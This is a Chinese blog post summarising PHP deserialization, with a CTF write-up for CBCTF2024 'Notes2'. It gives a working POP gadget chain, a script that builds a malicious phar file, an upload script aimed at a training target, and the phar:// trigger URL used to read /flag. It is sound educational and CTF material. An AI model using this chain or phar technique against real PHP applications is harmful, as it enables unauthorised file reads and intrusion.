---
title: PHP反序列化小结
categories:
- Note&Summary
tag:
- CTF
- web
- PHP
- 反序列化
date: 2025-02-01 18:17:47
excerpt: CBCTF后的一个PHP反序列化小结......
index_img: /img/PHP.png
banner_img: /img/PHP.png
---

# PHP反序列化小结

# 什么是序列化与反序列化

首先，序列化是将对象转化为可存储或传输的字符串格式的过程。在 php 中，可以使用 serialize()函数将对象，数组或其它数据类型序列化称为一个字符串，以便将其保存到文件或者进行网络传输。

反序列化则是将之前序列化得到的字符串重新转换为原始的 php 数据结构或对象的过程。在 php 中，可以使用 unserialize()函数对序列化后的字符串进行反序列化操作。

如下即为某个对象序列化后的字符串样式

```php
O:6:"_0rays":2:{s:3:"jbn";s:7:"phpinfo";s:6:"pankas";O:4:"lets":4:{s:6:"mak4r1";s:3:"asc";s:4:"ech0";N;s:6:"rocket";O:4:"lets":4:{s:6:"mak4r1";N;s:4:"ech0";O:2:"go":1:{s:8:"ed_xinhu";O:4:"lets":4:{s:6:"mak4r1";N;s:4:"ech0";N;s:6:"rocket";N;s:6:"errmis";s:5:"/flag";}}s:6:"rocket";N;s:6:"errmis";N;}s:6:"errmis";N;}}
```

序列化的意义主要在于方便数据的存储和传输。

# 反序列化漏洞的产生、利用原理

反序列化漏洞的产生主要因为存在一些含魔术方法的可利用的类、用户可控的参数，通过设计各个类的属性参数，实现反序列化时各个魔术方法的自动（连锁）调用从而执行目的操作。目前我所接触到的一般的 PHP 反序列化漏洞通常搭配文件上传，服务器接收序列化的文件后我们通过一些操作让服务器对其进行反序列化处理。

# 魔术方法

（这里主要都是 PHP，其他的可能类似，还没有研究）

魔术方式是在特定情况下会自动调用的特殊方法，会覆盖 PHP 的默认操作，可以自定义方法的内容。做一些反序列化的题目时需要熟练掌握各个魔术方法的调用条件。

```php
__construct():具有构造函数的类会在每次创建新对象时先调用此方法。
__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
__toString():方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 
__sleep()方法在一个对象被序列化之前调用；
__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。
__get():当调用一个类及其父类方法中未定义的**属性**时
__set():当设置一个类及其父类方法中未定义的**属性**时
__invoke():调用函数的方式调用一个对象时的回应方法
```

更全的魔术方法信息参考：[https://www.php.net/manual/zh/language.oop5.magic.php](https://www.php.net/manual/zh/language.oop5.magic.php)

# 反序列化例题

## CBCTF2024 Notes2

题目提供了源码如下：

```php
<?php

// easy unserialize chain OuO

class notes{
    function __construct($filepath){
        readfile($filepath);
    }
}

// flag in /flag , let's go !!

class _0rays{
    public $jbn;
    public $pankas;
    function __wakeup(){
        if(call_user_func($this -> jbn)){
            throw new Exception($this -> pankas);
        }else{
            echo "ha?";
        }
    }
}

class lets{
    public static $yolbby = "nonono";
    public $mak4r1;
    public $ech0;
    public $rocket;
    public $errmis;
    function __toString(){
        $humb1e = md5($this -> mak4r1);
        $k0rian = substr($humb1e,-4,-1);
        $this -> rocket -> dbg = $k0rian;
        return "O.o?";
    }
    function __set($a, $b){
        self::$yolbby = $b;
        $int_barbituric = $this -> ech0 -> gtg;

    }

    function __invoke(){
        new notes($this -> errmis);
    }

}

class go{
    public $ed_xinhu;

    function __get($c){
        if(lets::$yolbby === "666"){
            $dilvey = $this -> ed_xinhu;
            return $dilvey();
        }else{
            echo "you are going to win !";
        }
    }

}

function check($filePath) {
    if(!file_exists($filePath)){
        return false;
    }
    $realPath = realpath($filePath);
    if (strpos($realPath, '/notes') === 0 ) {
        return true;
    }
    return false; 
}

function listnote() {
    $directory = '/notes'; 
    $files = array_filter(scandir($directory), function ($file) use ($directory) {
        return is_file("$directory/$file");
    });
    foreach ($files as $f) {
        $link = '<a href="/index.php?note=/notes/' . htmlspecialchars($f) . '">' . htmlspecialchars($f) . '</a> <p></p>';
        echo $link;
    }
    echo '<a href="/index.php?note=show-me-source">show source</a>';
}

// upload your own note ? (under development)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_FILES['user_note'] ?? null;
    if ($file && strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'txt') {
        $randomFileName = uniqid() . '.txt';
        $targetFilePath = "/notes/" . $randomFileName;
        if (move_uploaded_file($file['tmp_name'], $targetFilePath)) {
            echo "Your note successfully saved in :".$targetFilePath;
            exit;
        }
    }
    die("error");   
}

$note = @$_GET['note'];
if($note){
    if($note === "show-me-source"){
        highlight_file(__FILE__);
    }else{
        if(check($note)){
            header('Content-Type: text/plain; charset=UTF-8');
            new notes($note);
        }else{
            die("hacker...");
        }
    }
}else{
    echo "<h1>这里是mak自己悄悄留给你的一些笔记哦，打开看看吧</h1>";
    echo "<h2>Notes List:<h2>";
    listnote();
}

highlight_file(__FILE__);
?>
```

### 解题详细过程

#### 1.初步观察分析，得到大致方向

很明确告知是反序列化题，可以在源码看到文件上传的接口，所以先上传序列化 phar 文件再触发反序列化

```php
// upload your own note ? (under development)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_FILES['user_note'] ?? null;
    if ($file && strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'txt') {
        $randomFileName = uniqid() . '.txt';
        $targetFilePath = "/notes/" . $randomFileName;
        if (move_uploaded_file($file['tmp_name'], $targetFilePath)) {
            echo "Your note successfully saved in :".$targetFilePath;
            exit;
        }
    }
    die("error");   
}
```

首先观察可利用的类及魔术方法：

```php
本题中存在的魔术方法：
__construct():存在于**notes**类中，具有构造函数的类会在每次创建新对象时先调用此方法。
__toString():存在于**lets**类中，方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 
__wakeup():存在于**_0rays**类中，unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用__wakeup方法，预先准备对象需要的资源。
__get():存在于**go**类中，当调用一个类及其父类方法中未定义的**属性**时
__set():存在于**lets**类中，当设置一个类及其父类方法中未定义的**属性**时
__invoke():存在于**lets**类中，调用函数的方式调用一个对象时的回应方法
```

其次观察可利用于实现目的操作的语句

```php
发现目标存在于notes类中，只要让$filepath参数为'/flag'即可通过readfile()获得flag：

class notes{
    function __construct($filepath){
        readfile($filepath);
    }
}

// flag in /flag , let's go !!
```

再次，寻找首个触发的魔术方法

```php
发现目标存在于_0rays类中的__wakeup()，当发生反序列化时会优先调用该方法
所以可以作为反序列化攻击的入口，从该方法开始到__construct($filepath)方法的readfile()构造链子

class _0rays{
    public $jbn;
    public $pankas;
    function __wakeup(){
        if(call_user_func($this -> jbn)){
            throw new Exception($this -> pankas);
        }else{
            echo "ha?";
        }
    }
}
```

#### 2.深入分析，构造链子

这一步就需要结合每一个魔术方法的自动调用条件分析，然后以<u>套娃</u>的形式不断<u>将父类中的特定属性声明为调用魔术方法所在的类，实现魔术方法层层向目标调用的效果。</u>最后序列化生成 phar 文件用于上传。

1.__wakeup()作为入口：

```php
class _0rays{
    public $jbn;
    public $pankas;
    function __wakeup(){
        if(call_user_func($this -> jbn)){
        //call_user_func($this -> jbn)存在时throw抛出，可令属性$jbn='phpinfo'
            throw new Exception($this -> pankas);
            //属性$pankas作为字符串被抛出，因此可以联想到lets类中的魔术方法__toString()
            //lets类被当做字符串时自动调用魔术方法__toString()
        }else{
            echo "ha?";
        }
    }
}
```

2.令 $pankas 为 lets 类来衔接 lets 类中的魔术方法__toString()：

```php
class lets{
    public static $yolbby = "nonono";
    public $mak4r1;
    public $ech0;
    public $rocket;
    public $errmis;
    function __toString(){
        $humb1e = md5($this -> mak4r1);
        $k0rian = substr($humb1e,-4,-1);
        $this -> rocket -> dbg = $k0rian;
        //$mak4r1用md5加密后的倒数2~4位赋值给一个未声明的属性，联想到lets类中的魔术方法__set()
        //lets类未声明的属性被赋值时自动调用魔术方法__set()
        return "O.o?";
    }
    function __set($a, $b){
        self::$yolbby = $b;
        $int_barbituric = $this -> ech0 -> gtg;

    }

    function __invoke(){
        new notes($this -> errmis);
    }

}
```

3.令 $rocket 为 lets 类来衔接 lets 类中的魔术方法__set()：

```php
class lets{
    public static $yolbby = "nonono";
    public $mak4r1;
    public $ech0;
    public $rocket;
    public $errmis;
    function __toString(){
        $humb1e = md5($this -> mak4r1);
        $k0rian = substr($humb1e,-4,-1);
        $this -> rocket -> dbg = $k0rian;
        return "O.o?";
    }
    function __set($a, $b){
        //$a为被赋值变量，$b为赋值变量，即上一层级的$k0rian
        self::$yolbby = $b;
        $int_barbituric = $this -> ech0 -> gtg;
        //未被声明的属性gtg赋值给变量$int_barbituric，联想到go类中的魔术方法__get()
        //go类未声明的属性用于赋值时自动调用魔术方法__get()
    }

    function __invoke(){
        new notes($this -> errmis);
    }

}
```

4.令 $ech0 为 go 类来衔接 go 类中的魔术方法__get()：

```php
class go{
    public $ed_xinhu;

    function __get($c){
        if(lets::$yolbby === "666"){
            //当上一层级lets类变量$yolbby等于"666"时
            $dilvey = $this -> ed_xinhu;
            return $dilvey();
            //变量$dilvey被作为函数调用，联想到lets类中的魔术方法__invoke()
            //lets类的对象被当做函数调用时自动调用魔术方法__invoke()
        }else{
            echo "you are going to win !";
        }
    }

}
```

5.令 $ed_xinhu 为 lets 类来衔接 lets 类中的魔术方法__invoke()：

```php
class lets{
    public static $yolbby = "nonono";
    public $mak4r1;
    public $ech0;
    public $rocket;
    public $errmis;
    function __toString(){
        $humb1e = md5($this -> mak4r1);
        $k0rian = substr($humb1e,-4,-1);
        $this -> rocket -> dbg = $k0rian;
        return "O.o?";
    }
    function __set($a, $b){
        self::$yolbby = $b;
        $int_barbituric = $this -> ech0 -> gtg;

    }

    function __invoke(){
        new notes($this -> errmis);
        //创建参数为$errmis的notes类新对象，自动调用notes类魔术方法__construct()
    }

}
```

6.令 $errmis 为'/flag'：

```php
class notes{
    function __construct($filepath){
        readfile($filepath);
        //参数传递给$filepath即执行readfile('/flag')
    }
}
```

7.综上构造链子

```php
$ray = new _0rays();
$ray->jbn = 'phpinfo';
$lets=new lets();
$lets->mak4r1='asc';
//$mak4r1-->用md5加密-->取倒数2~4位-->$yolbby
//写个python脚本枚举出一个md5加密后密文满足'666'条件的字符串即可
$new_lets1=new lets();
$go = new go();
$go->ed_xinhu=new lets();
$go->ed_xinhu->errmis='/flag';
$new_lets1->ech0=$go;
$lets->rocket=$new_lets1;
$ray->pankas=$lets;
```

枚举用的 python 脚本

```python
import hashlib
from random import randint

def md5_hash(input_string):
    md5_hash = hashlib.md5()
    md5_hash.update(input_string.encode('utf-8'))
    return md5_hash.hexdigest()

while(1):
    input_string = chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))
    if md5_hash(input_string)[-4:-1]== "666":
        print(input_string)
        print(md5_hash(input_string))
        break
```

各对象变量的结构图

![](/img/PHP反序列化小结/1.png)

#### 3.生成 phar 文件，上传并触发反序列化

结合上面写好的在本地跑出 phar 文件并测试正确性，可以用小皮看一下效果，也可以 vscode 上配一下环境调试一下看看，加深反序列化攻击过程的理解。

```php
<?php

// easy unserialize chain OuO

class notes{
    function __construct($filepath){
        readfile($filepath);
    }
}

// flag in /flag , let's go !!

class _0rays{
    public $jbn;
    public $pankas;
    function __wakeup(){
        if(call_user_func($this -> jbn)){
            throw new Exception($this -> pankas);
        }else{
            echo "ha?";
        }
    }
}

class lets{
    public static $yolbby = "nonono";
    public $mak4r1;
    public $ech0;
    public $rocket;
    public $errmis;
    function __toString(){
        $humb1e = md5($this -> mak4r1);
        $k0rian = substr($humb1e,-4,-1);
        $this -> rocket -> dbg = $k0rian;
        return "O.o?";
    }
    function __set($a, $b){
        self::$yolbby = $b;
        $int_barbituric = $this -> ech0 -> gtg;

    }

    function __invoke(){
        new notes($this -> errmis);
    }

}

class go{
    public $ed_xinhu;

    function __get($c){
        if(lets::$yolbby === "666"){
            $dilvey = $this -> ed_xinhu;
            return $dilvey();
        }else{
            echo "you are going to win !";
        }
    }

}

function check($filePath) {
    if(!file_exists($filePath)){
        return false;
    }
    $realPath = realpath($filePath);
    if (strpos($realPath, '/notes') === 0 ) {
        return true;
    }
    return false; 
}

function listnote() {
    $directory = '/notes'; 
    $files = array_filter(scandir($directory), function ($file) use ($directory) {
        return is_file("$directory/$file");
    });
    foreach ($files as $f) {
        $link = '<a href="/index.php?note=/notes/' . htmlspecialchars($f) . '">' . htmlspecialchars($f) . '</a> <p></p>';
        echo $link;
    }
    echo '<a href="/index.php?note=show-me-source">show source</a>';
}

// upload your own note ? (under development)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_FILES['user_note'] ?? null;
    if ($file && strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'txt') {
        $randomFileName = uniqid() . '.txt';
        $targetFilePath = "/notes/" . $randomFileName;
        if (move_uploaded_file($file['tmp_name'], $targetFilePath)) {
            echo "Your note successfully saved in :".$targetFilePath;
            exit;
        }
    }
    die("error");   
}

$note = @$_GET['note'];
if($note){
    if($note === "show-me-source"){
        highlight_file(__FILE__);
    }else{
        if(check($note)){
            header('Content-Type: text/plain; charset=UTF-8');
            new notes($note);
        }else{
            die("hacker...");
        }
    }
}else{
    echo "<h1>这里是mak自己悄悄留给你的一些笔记哦，打开看看吧</h1>";
    echo "<h2>Notes List:<h2>";
    listnote();
}

//前面写好的链子
$ray = new _0rays();
$ray->jbn = 'phpinfo';
$lets=new lets();
$lets->mak4r1='asc';
$new_lets1=new lets();
$go = new go();
$go->ed_xinhu=new lets();
$go->ed_xinhu->errmis='/flag';
$new_lets1->ech0=$go;
$lets->rocket=$new_lets1;
$ray->pankas=$lets;

//生成phar文件
@unlink("phar.phar");    //删除之前的phar.phar文件(如果有)
$phar = new Phar("phar.phar");
$phar->startBuffering();            //开始写文件
$phar->setStub("<?php __HALT_COMPILER(); ?>");    //写入stu头部信息
$phar->setMetadata($ray);    //重点！！将构造好的链子写入meta-data也就是manifest字段，这里会自动进行序列化，因此传入链头就行。其实可以理解为serialize（$o）;
$phar->addFromString("phar.txt", "phar");
$phar->stopBuffering();

//本地测试
//$serialized = serialize($ray);//在本地序列化观察一下序列化的结果
//echo $serialized;
//unserialize($serialized);//可以在本地测试一下是否成功

highlight_file(__FILE__);
?>
```

先根据源码文件上传部分的限制，修改 phar 文件的后缀变为 txt，然后用 python 发送文件到靶机

```python
import requests

url = "http://e12a0360-5b3b-412a-a898-6edf2af3f94a.training.0rays.club:8001/"
file = open("phar.txt",'rb')
res = requests.post(url, files={"user_note":file})
print(res.text)
```

上传成功返回上传文件的重命名名称，最后利用 phar 伪协议 `phar://` 访问文件触发反序列化即可

`http://（靶机）/index.php?note=phar:///notes/（重命名的文件名.txt）`

![](/img/PHP反序列化小结/2.png)

### 出现的问题

#### 1.没搞清楚对象的层次结构导致链子构造错误

![修改前](/img/PHP反序列化小结/3.png)

![修改后](/img/PHP反序列化小结/4.png)

#### 2.题目看错

取倒数 2~4 位，搞成倒数 1~3 位，如上图 mak4r1 均取值错误

#### 3.使用 phar 伪协议触发反序列化错误

错误 `http://（靶机）/index.php?note=phar://notes/（重命名的文件名.txt）`

正确 `http://（靶机）/index.php?note=phar:///notes/（重命名的文件名.txt）`

`/notes/（重命名的文件名.txt）` 才是正确的文件路径，用 `phar://` 伪协议包含要反序列化的文件

### 官方 WP

[2024 CBCTF WriteUps](https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd)

![](/img/PHP反序列化小结/5.png)

# 总结、感悟、收获

## 1.如何理解链子的层层调用、对象的结构关系

既然叫链子，那么就要一环套一环，通过连续的自动调用来达到“利用原本无法利用的源码”的目的。然而，只有当前对象为包含某魔术方法的类的对象时，当前对象触发该魔术方法自动调用的条件，该魔术方法的自动调用才能生效。例如：_0rays 类下含有魔术方法__wakeup()，只有对象 ray 为_0rays 类时，对象 ray 被反序列化（触发调用条件），魔术方法__wakeup()被自动调用。

所以，要让链子依次调用魔术方法，那么<u>上一个对象</u>为上一个目标魔术方法所在的类的对象，<u>上一个对象的属性</u>为下一个目标魔术方法所在的类的对象，从而将一个个魔术方法链接起来。<u>形象地讲就是对象按对应魔术方法的调用顺序依次套娃。</u>

> Tips:
> 因为我花了不少功夫才大致搞明白，所以写的比较详细且啰嗦，光看太绕了，最好结合前面 CBCTF2024 Notes2 调试时的变量结构图理解，调试一遍看一下。

# 参考资料：

[https://xz.aliyun.com/news/11953](https://xz.aliyun.com/news/11953)

[https://cloud.tencent.com/developer/article/1945248](https://cloud.tencent.com/developer/article/1945248)
